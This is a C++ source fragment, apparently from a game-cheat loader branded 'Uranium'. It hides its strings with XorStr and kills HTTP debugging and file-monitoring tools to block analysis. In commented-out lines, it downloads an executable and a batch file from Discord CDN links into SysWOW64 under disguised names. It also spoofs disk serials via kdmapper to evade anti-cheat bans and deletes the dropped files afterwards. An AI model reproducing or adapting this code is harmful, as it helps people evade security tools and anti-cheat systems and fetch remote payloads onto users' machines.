	//HRESULT hr11 = URLDownloadToFileA(NULL, XorStr("https://cdn.discordapp.com/attachments/792792378435174411/900044342444580864/wqesd.exe").c_str(), XorStr("C:\\Windows\\SysWOW64\\Logs4Support.exe").c_str(), 0, NULL);//eacforcer
	SetConsoleTitleA(XorStr("Uranium Undetected Cheat Loaded").c_str());
	std::cout << XorStr("\n\n Dropping Files... May Take 30 Seconds");
	system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
	system(XorStr("taskkill /f /im HTTPDebugger.exe >nul 2>&1").c_str());
	system(XorStr("taskkill /f /im FolderChangesView.exe >nul 2>&1").c_str());
	system(XorStr("sc stop HttpDebuggerSdk >nul 2>&1").c_str());




	


	system(XorStr("cls").c_str());
	std::cout << "\n  Loading Files... May Take A Few Seconds: ";






	//HRESULT hr9 = URLDownloadToFileA(NULL, XorStr("https://cdn.discordapp.com/attachments/890985121132445716/891064273491591338/bigmonke.bat").c_str(), XorStr("C:\\Windows\\SysWOW64\\Kripton134.txt").c_str(), 0, NULL);//eacforcer
	/*std::cout << "\n  |Kripton| Would you like to spoof? (Undetected On EAC) [Y/N]: ";
	using std::cin;

	cin >> spoofy;
	if ((spoofy == 'y') || (spoofy == 'Y')) {

	std::cout << XorStr("\n Press any key to spoof");
	system(XorStr("pause >nul 2>&1").c_str());
	std::cout << XorStr("\n Spoofing..");


	std::cout << XorStr("\n Old Serial: ");
	system(XorStr("wmic diskdrive get serialnumber").c_str());

	std::string command = kdmapper + XorStr(" ") + spoof;
	system_no_output(command.c_str());

	Sleep(800);
	std::cout << XorStr("\n New Serial: ");
	system(XorStr("wmic diskdrive get serialnumber").c_str());
	Sleep(2000);



	remove(driver.c_str());
	remove(spoof.c_str());
	remove(kayit.c_str());

	mainy();



	}
	else
	{


		remove(driver.c_str());
		remove(spoof.c_str());
		remove(kayit.c_str());*/

	mainy();
	//>}








	Sleep(1900);

}
